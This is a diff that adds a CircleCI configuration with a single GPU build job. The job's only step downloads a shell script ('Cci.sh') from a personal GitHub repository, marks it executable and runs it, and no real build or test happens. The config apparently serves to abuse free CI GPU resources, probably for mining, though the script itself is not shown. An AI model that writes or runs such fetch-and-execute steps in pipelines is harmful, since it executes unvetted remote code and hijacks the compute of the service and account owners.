@@ -1,0 +1,9 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004-cuda-11.4:202110-01
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
